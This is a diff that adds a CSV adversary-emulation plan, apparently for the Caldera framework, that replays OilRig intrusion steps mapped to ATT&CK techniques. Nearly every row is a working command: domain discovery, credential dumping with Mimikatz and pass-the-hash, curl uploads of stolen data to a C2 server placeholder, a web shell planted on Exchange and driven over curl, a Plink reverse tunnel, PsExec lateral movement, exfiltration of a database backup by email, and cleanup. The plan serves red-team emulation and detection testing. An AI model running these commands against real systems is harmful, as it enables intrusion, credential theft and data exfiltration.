@@ -1,0 +1,118 @@
+﻿source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
+oilrig,oilrig,OilRig,1,1,ed2471a9-1eeb-4787-a5d8-61f66b278a50,1.A.4,discovery,T1082,System Information Discovery,OilRig Execute VBS payload to collect hostname,Executes the payload to collect the hostname of the victim machine.,cscript /nologo computername.vbs,cscript /nologo computername.vbs
+oilrig,oilrig,OilRig,1,2,88378065-bedf-46b9-a8b7-bc5897f4abcb,1.A.5,discovery,T1033,System Owner/User Discovery,OilRig Execute VBS payload to collect username,Executes the payload to collect the username of the victim machine.,cscript /nologo username.vbs,cscript /nologo username.vbs
+oilrig,oilrig,OilRig,2,3,0386ef16-757e-425c-8355-88e5be40eb32,2.A.2,discovery,T1033,System Owner/User Discovery,OilRig Current User,Obtain user from current session,whoami,whoami
+oilrig,oilrig,OilRig,2,4,a9861ea9-4f9a-46c9-ba60-15a02806dfdc,2.A.3,Discovery,T1082,System Information Discovery,OilRig Collect hostname,Find the hostname,hostname,hostname
+oilrig,oilrig,OilRig,2,5,628e8ad3-14af-4670-b797-bcf175a42842,2.A.4,Discovery,T1016,System Network Configuration Discovery,OilRig Network Interface Configuration,View network configuration information for host,ipconfig /all,ipconfig /all
+oilrig,oilrig,OilRig,2,6,13d5ab62-c05a-4d25-bd8f-e3b27a5be611,2.A.5,Discovery,T1087.002,Account Discovery: Domain Account,OilRig Domain Account Discovery,The net utility is executed via cmd to enumerate domain user accounts.,net user /domain,net user /domain
+oilrig,oilrig,OilRig,2,7,e0b534a6-bff3-4964-8f7b-863ddee224b0,2.A.6,Discovery,T1069.002,Permission Groups Discovery: Domain Groups,OilRig Group Account Discovery,The net utility is executed via cmd to enumerate group accounts.,net group /domain,net group /domain
+oilrig,oilrig,OilRig,2,8,3d450711-1062-4276-8bff-bb78ec4f4519,2.A.7,Discovery,T1069.002,Permission Groups Discovery: Domain Groups,"OilRig ""domain admins"" Group Discovery","The net utility is executed via cmd to enumerate the ""domain admins"" group","net group ""domain admins"" /domain","net group ""domain admins"" /domain"
+oilrig,oilrig,OilRig,2,9,29c018ed-eb3e-4ddb-90ec-ba3d928a00e8,2.A.8,Discovery,T1069.002,Permission Groups Discovery: Domain Groups,"OilRig ""Exchange Trusted Subsystem"" Group Discovery","The net utility is executed via cmd to enumerate the ""Exchange Trusted Subsystem"" group","net group ""Exchange Trusted Subsystem"" /domain","net group ""Exchange Trusted Subsystem"" /domain"
+oilrig,oilrig,OilRig,2,10,41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19,2.A.9,Discovery,T1021,Password Policy Discovery,OilRig List domain account settings,View domain account settings and password policy,net accounts /domain,net accounts /domain
+oilrig,oilrig,OilRig,2,11,821fd81e-2086-4ea6-b792-fb9e044e2323,2.A.10,Discovery,T1087.001,Account Discovery: Local Account,OilRig Local Account Discovery,Enumerate user accounts,net user,net user
+oilrig,oilrig,OilRig,2,12,ae4e4c08-82cb-4a17-a873-660f851a1a38,2.A.11,Discovery,T1069.001,Permission Groups Discovery: Local Groups,"OilRig ""administrators"" local group discovery","View the details and members of the ""administrators"" local group",net localgroup administrators,net localgroup administrators
+oilrig,oilrig,OilRig,2,13,cb8e9faa-ac00-48d8-a359-88044a2c0252,2.A.12,Discovery,T1049,System Network Connections Discovery,OilRig View Network Connections,Find system network connections,netstat -na,netstat -na
+oilrig,oilrig,OilRig,2,14,de39f574-f6cc-4026-973e-c5370b36220b,2.A.13,Discovery,T1057,Process Discovery,OilRig Process discovery,View running processes on system,tasklist,tasklist
+oilrig,oilrig,OilRig,2,15,e6eb7d18-606e-4889-8924-f75cafa92811,2.A.14,Discovery,T1007,System Service Discovery,OilRig System Service Discovery,Gather information about registered local system services,sc query,sc query
+oilrig,oilrig,OilRig,2,16,178bb431-4eaf-43b1-922c-f484ab54bbee,2.A.15,Discovery,T1082,System Information Discovery,OilRig System Information Discovery,Gather detailed system information,systeminfo,systeminfo
+oilrig,oilrig,OilRig,2,17,09502b3c-7541-4c11-92a9-f55e683a6355,2.A.16,Discovery,T1012,Query Registry,OilRig Query Registry,Query the Windows registry key HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default,"reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default""","reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"""
+oilrig,oilrig,OilRig,2,18,7971246d-1392-411e-a803-a7946cf9e4d2,2.A.17,Discovery,T1087.002,Account Discovery: Domain Account,"OilRig Targeted ""Gosta"" Account Discovery",The net utility is executed via cmd to enumerate detailed information about the Gosta user account,net user #{initial.target.user} /domain,net user #{initial.target.user} /domain
+oilrig,oilrig,OilRig,2,19,6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe,2.A.18,Discovery,T1069.002,Permission Groups Discovery: Domain Groups,"OilRig ""SQL Admins"" Group Discovery","The net utility is executed via cmd to enumerate the ""SQL Admins"" group","net group ""SQL Admins"" /domain","net group ""SQL Admins"" /domain"
+oilrig,oilrig,OilRig,2,20,f9f1bd68-ec0a-47e7-8645-210844190d92,2.A.19,Discovery,T1018,Remote System Discovery,OilRig nslookup WATERFALLS,Perform DNS lookup for WATERFALLS,nslookup #{second.target.host},nslookup #{second.target.host}
+oilrig,oilrig,OilRig,3,21,a23fb84f-dfb7-4d07-a6ec-0352ae983651,3.A.2,credential-access,T1555.004,Credentials from Password Stores: Windows Credential Manager,OilRig Dump Credentials from Windows Credential Manager,Create a SQLite database with output of Windows Credential Value for Internet Explorer,C:\Users\#{initial.target.user}\AppData\local\SystemFailureReporter\b.exe,C:\Users\#{initial.target.user}\AppData\local\SystemFailureReporter\b.exe
+oilrig,oilrig,OilRig,3,22,021245dd-c0be-4900-bd6c-1c680f00a237,3.A.3,exfiltration,T1041,Exfiltration Over C2 Channel,OilRig Exfil fsociety.dat,Exfil the SQLite database fsociety.dat created by b.exe,"curl -F ""data=@C:\Users\#{initial.target.user}\AppData\Roaming\fsociety.dat"" --header ""X-Request-ID: #{initial.target.user}-#{paw}"" #{server}/file/upload","curl -F ""data=@C:\Users\#{initial.target.user}\AppData\Roaming\fsociety.dat"" --header ""X-Request-ID: #{initial.target.user}-#{paw}"" #{server}/file/upload"
+oilrig,oilrig,OilRig,4,23,2f3be960-5c00-4f03-a9c2-da09c31d38d9,4.A.1,Command and Control,T1105,Ingress Tool Transfer,OilRig Copy webshell to THEBLOCK,SystemFailureReporter.exe downloads contact.aspx,copy C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\contact.aspx C:\Users\Public\contact.aspx,copy  C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\contact.aspx C:\Users\Public\contact.aspx
+oilrig,oilrig,OilRig,4,24,7aaecfb7-a1eb-477c-8d53-ab3009389623,4.A.2,persistence,T1505.003,Server Software Component: Web Shell,OilRig Copy webshell to WATERFALLS,contact.aspx is copied from THEBLOCK to WATERFALL to the Exchange Web Services directory. This ability implements Step 4.A.3.,"copy C:\Users\Public\contact.aspx ""\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\""","copy C:\Users\Public\contact.aspx ""\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\"""
+oilrig,oilrig,OilRig,4,25,5f7dc4b3-1287-4a25-b0b0-b6e73756cc11,4.A.4,defense-evasion,T1082,Hide Artifacts: Hidden Files & Directories,OilRig Set file hidden attribute,Set file hidden attribute for contact.aspx on WATERFALLS,"attrib +h ""\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx""","attrib +h ""\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx"""
+oilrig,oilrig,OilRig,5,26,87d3322b-a435-47b5-9f97-a8db4f86dad5,5.A.2,discovery,T1033,System Owner/User Discovery,OilRig Current User (Kali Agent),Attacker machine obtains user from current session gosta's current session on 10.1.0.6,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=whoami"" https://#{second.target.ip}/ews/contact.aspx","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=whoami"" https://#{second.target.ip}/ews/contact.aspx"
+oilrig,oilrig,OilRig,5,27,48927544-5a18-11ed-9b6a-0242ac120002,5.A.3,Discovery,T1016,System Network Configuration Discovery,OilRig Network Interface Configuration (Kali Agent),Attacker machine views network configuration information for gosta on 10.1.0.6,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=ipconfig /all"" https://#{second.target.ip}/ews/contact.aspx","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=ipconfig /all"" https://#{second.target.ip}/ews/contact.aspx"
+oilrig,oilrig,OilRig,5,28,5c279562-a004-4d9c-9ec6-a7dc4997f699,5.A.4,Discovery,T1049,System Network Connections Discovery,OilRig View Network Connections (Kali Agent),Attacker machine views system network connections for gosta on 10.1.0.6,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=netstat -an"" https://#{second.target.ip}/ews/contact.aspx","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=netstat -an"" https://#{second.target.ip}/ews/contact.aspx"
+oilrig,oilrig,OilRig,6,29,f96e8195-8b0f-4b87-bdce-748dfda2861f,6.A.1,Command and Control,T1105,Ingress Tool Transfer,OilRig Download Mimikatz (Kali Agent),Download Mimikatz,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\temp\' -F ""vir=false"" -F ""nen=m64.exe"" -F 'f1=@m64.exe' https://#{second...","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\temp\' -F ""vir=false"" -F ""nen=m64.exe"" -F 'f1=@m64.exe' https://#{second.target.ip}/EWS/contact.aspx"
+oilrig,oilrig,OilRig,6,30,f01e86f9-0b66-4191-beee-324c380690df,6.A.2,Credential Access,T1003.001,OS Credential Dumping: LSASS Memory,OilRig Execute Mimikatz (Kali Agent),Dump credentials using Mimikatz,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit...","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit 1> C:\Windows\Temp\01.txt"" https://#{second.target.ip}/ews/contact.aspx"
+oilrig,oilrig,OilRig,6,31,845d36f1-13b6-4d42-a384-aa2f4af9bc27,6.A.3,Exfiltration,T1041,Exfiltration Over C2 Channel,OilRig Exfiltrate Mimikatz Output (Kali Agent),Exfiltrate the resulting output file to the attacker system,curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://#{second.target.ip}/EWS/contact.aspx,curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://#{second.target.ip}/EWS/contact.aspx
+oilrig,oilrig,OilRig,6,32,6482ba12-fa47-409c-bab8-704de6475e38,6.A.4,Defense Evasion,T1070.004,Indicator Removal on Host: File Deletion,OilRig Delete Mimikatz and MimiKatz Output (Kali Agent),Clean up by removing the binary and output file,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe"" https://#{second.t...","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe"" https://#{second.target.ip}/EWS/contact.aspx"
+oilrig,oilrig,OilRig,7,33,f3df5a83-2a5a-4277-8763-8fb51032d3fc,7.A.1,Command and Control,T1105,Ingress Tool Transfer,OilRig Download Plink,Download Plink in order to gain RDP access,copy C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\plink.exe C:\Users\Public\Downloads\plink.exe,copy  C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\plink.exe C:\Users\Public\Downloads\plink.exe
+oilrig,oilrig,OilRig,7,34,212995b5-acfc-404b-b3a9-a19cc0afa9a5,7.A.2,Command and Control,T1572,Protocol Tunneling,OilRig Run Plink,Run Plink,"exec-background C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw ""#{caldera.user.password}"" #{caldera.server.ip}","exec-background C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw ""#{caldera.user.password}"" #{caldera.server.ip}"
+oilrig,oilrig,OilRig,7,35,dc2efbdd-3ab4-44a0-9839-385540b8a8cc,7.A.4,Lateral Movement,T1021.001,Remote Services: Remote Desktop Protocol,OilRig RDP to WATERFALLS,RDP to 10.1.0.6 using xfreerdp,exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore,exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore
+oilrig,oilrig,OilRig,8,36,5cb977ae-87c8-450f-b016-f414b42ba60f,8.A.2,Command and Control,T1105,Ingress Tool Transfer,OilRig Downloads PsExec,OilRig uses the webshell to download PsExec as ps.exe to WATERFALLS,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\System32' -F ""vir=false"" -F ""nen=ps.exe"" -F 'f1=@PsExec.exe' https://#{s...","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\System32' -F ""vir=false"" -F ""nen=ps.exe"" -F 'f1=@PsExec.exe' https://#{second.target.host}/ews/contact.aspx"
+oilrig,oilrig,OilRig,8,37,d5b83af2-b79e-438d-acfc-2641282df698,8.A.3,Command and Control,T1105,Ingress Tool Transfer,OilRig Downloads RDAT,OilRig uses the webshell to download RDAT as nt.dat to WATERFALLS,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\Temp' -F ""vir=false"" -F ""nen=Nt.dat"" -F 'f1=@RDAT.exe' https://#{second....","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\Temp' -F ""vir=false"" -F ""nen=Nt.dat"" -F 'f1=@RDAT.exe' https://#{second.target.host}/ews/contact.aspx"
+oilrig,oilrig,OilRig,8,38,98279c81-d5a0-4ec4-9d40-a6e87d1f9bd2,8.A.4,Command and Control,T1105,Ingress Tool Transfer,OilRig Downloads mom64.exe,OilRig uses the webshell to download Mimikatz as mom64.exe to WATERFALLS,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\System32' -F ""vir=false"" -F ""nen=mom64.exe"" -F 'f1=@m64.exe' https://#{s...","curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\System32' -F ""vir=false"" -F ""nen=mom64.exe"" -F 'f1=@m64.exe' https://#{second.target.host}/ews/contact.aspx"
+oilrig,oilrig,OilRig,8,39,44073aa3-70e9-4a48-86b7-c25b6f29c25c,8.A.9,Execution,T1569.002,System Services: Service Execution,OilRig PSEXEC is used to execute commands on ENDOFROAD,"Requires xdotool to be installed on the running machine. Uses xdotool to control the RDP window to 10.1.0.6 that was opened in Step 7.A.4. Executes Mimikatz PTH, copies RDAT to 10.1.0.7, and PsExecs to the SQL server","sleep 5; rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost""); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool key --window ""$rdp_window"" Super_L; sleep 5; xdotool windowactivate --sync ""$rdp_window"" type --delay 200 ""...","sleep 5;
+rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost"");
+rdp_window=$(xdotool search --pid ""$rdp_pid"");
+xdotool key --window ""$rdp_window"" Super_L;
+sleep 5; 
+xdotool windowactivate --sync ""$rdp_window"" type --delay 200 ""cmd"";
+sleep 3; 
+xdotool key --window ""$rdp_window"" Ctrl+Shift+Return;
+sleep 3; 
+xdotool key --window ""$rdp_window"" Tab Tab;
+xdotool key --window ""$rdp_window"" Return;
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'C:\Windows\System32\mom64.exe ""privilege::debug"" ""sekurlsa::pth /user:#{second.target.user} /domain:#{network.domain.name} /ntlm:#{second.target.ntlm}""';
+xdotool key --window ""$rdp_window"" Return;
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'copy C:\Windows\Temp\Nt.dat \\#{third.target.ip}\C$\ProgramData\';
+xdotool key --window ""$rdp_window"" Return;
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'C:\Windows\System32\ps.exe \\#{third.target.ip} cmd.exe';
+xdotool key --window ""$rdp_window"" Return;
+sleep 5;"
+oilrig,oilrig,OilRig,9,40,f1f34439-ca0d-4fe7-99af-a198a29b6a3e,9.A.1-2,Discovery,T1083,File and Directory Discovery,OilRig File and Directory Discovery on ENDOFROAD,Requires xdotool to be installed on the running machine. Uses xdotool to execute file and directory discovery commands on ENDOFROAD,"sleep 3; rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost""); rdp_window=$(xdotool search --pid ""$rdp_pid""); sleep 3; xdotool type --window ""$rdp_window"" 'dir ""C:\Program Files\Microsoft SQL Server\""'; xdotool key --window ""...","sleep 3;
+rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost"");
+rdp_window=$(xdotool search --pid ""$rdp_pid"");
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'dir ""C:\Program Files\Microsoft SQL Server\""';
+xdotool key --window ""$rdp_window"" Return;
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'dir ""C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\""';
+xdotool key --window ""$rdp_window"" Return;
+sleep 4;"
+oilrig,oilrig,OilRig,10,41,885c14a2-bc56-4176-8671-4cb25489ae39,10.A.6,exfiltration,T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,OilRig Exfiltrate Data via EWS API to attacker-controlled email,Requires xdotool to be installed on the running machine. Creates a directory to stage collected data and moves RDAT to the newly created directory. Read and exfiltrate the data from sitedata_db.bak in chunks via EWS API to an attacker-controlled email.,"sleep 2; rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost""); rdp_window=$(xdotool search --pid ""$rdp_pid""); sleep 3; xdotool type --window ""$rdp_window"" 'mkdir C:\Programdata\Vmware'; xdotool key --window ""$rdp_window"" Retu...","sleep 2;
+rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost"");
+rdp_window=$(xdotool search --pid ""$rdp_pid"");
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'mkdir C:\Programdata\Vmware';
+xdotool key --window ""$rdp_window"" Return;
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe';
+xdotool key --window ""$rdp_window"" Return;
+sleep 3;
+xdotool type --window ""$rdp_window"" 'cd ""C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\""';
+xdotool key --window ""$rdp_window"" Return;
+sleep 3;
+xdotool type --window ""$rdp_window"" 'C:\ProgramData\Vmware\VMware.exe --path=""sitedata_db.bak"" --to=""#{exfil.target.email}"" --from=""#{initial.target.user}@#{network.domain.name}"" --server=""#{second.target.ip}"" --password='#{initial.target.password}' --chunksize=""200000""';
+sleep 1; 
+xdotool key --window ""$rdp_window"" Return;
+sleep 15;"
+oilrig,oilrig,OilRig,11,42,0c5cf9e2-3152-4b4c-9629-2ed7a00da09d,11.A.1-3,defense-evasion,T1070.004,Indicator Removal on Host: File Deletion,OilRig Cleanup via RDP,Requires xdotool to be installed on the running machine. Emulates OilRig's cleanup and egress from the target network.,"sleep 3; rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost""); rdp_window=$(xdotool search --pid ""$rdp_pid""); sleep 3; xdotool type --window ""$rdp_window"" 'del C:\ProgramData\VMware\VMware.exe'; sleep 3; xdotool key --window ...","sleep 3;
+rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost"");
+rdp_window=$(xdotool search --pid ""$rdp_pid"");
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'del C:\ProgramData\VMware\VMware.exe';
+sleep 3; 
+xdotool key --window ""$rdp_window"" Return;
+sleep 3; 
+xdotool type --window ""$rdp_window"" 'rmdir C:\ProgramData\VMware';
+sleep 3; 
+xdotool key --window ""$rdp_window"" Return;
+sleep 1;
+xdotool type --window ""$rdp_window"" 'exit';
+xdotool key --window ""$rdp_window"" Return;
+sleep 1;
+xdotool type --window ""$rdp_window"" 'exit';
+xdotool key --window ""$rdp_window"" Return;
+sleep 3;
+xdotool type --window ""$rdp_window"" 'exit';
+xdotool key --window ""$rdp_window"" Return;
+sleep 2;
+xdotool type --window ""$rdp_window"" 'del C:\Windows\System32\mom64.exe C:\Windows\temp\Nt.dat C:\Windows\System32\ps.exe';
+xdotool key --window ""$rdp_window"" Return;
+sleep 2;   
+xdotool type --window ""$rdp_window"" 'exit';
+xdotool key --window ""$rdp_window"" Return;
+sleep 2;
+
+kill $(ps aux | grep ""sshd: #{caldera.user.name}"" | grep -v priv | grep -v grep | awk '{print $2}')"
+oilrig,oilrig,OilRig,11,43,d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15,11.A.4,defense-evasion,T1070.004,Indicator Removal on Host: File Deletion,OilRig Cleanup on Gosta,Delete VALUEVAULT plink.exe.,del C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe;,del C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe;
+oilrig,oilrig,OilRig,11,44,16767c68-a865-46af-a0e4-ff8d742efc3f,11.A.4,defense-evasion,T1070.004,Indicator Removal on Host: File Deletion,OilRig Kill Gosta Agent,Gosta Agent kills itself,"curl -s -H ""KEY:#{server.api.key}"" -H ""Content-Type: application/json"" -X PATCH http://#{caldera.server.ip}:8888/api/v2/agents/#{paw} -d ""{\""watchdog\"":1}""","curl -s -H ""KEY:#{server.api.key}"" -H ""Content-Type: application/json"" -X PATCH http://#{caldera.server.ip}:8888/api/v2/agents/#{paw} -d ""{\""watchdog\"":1}"""
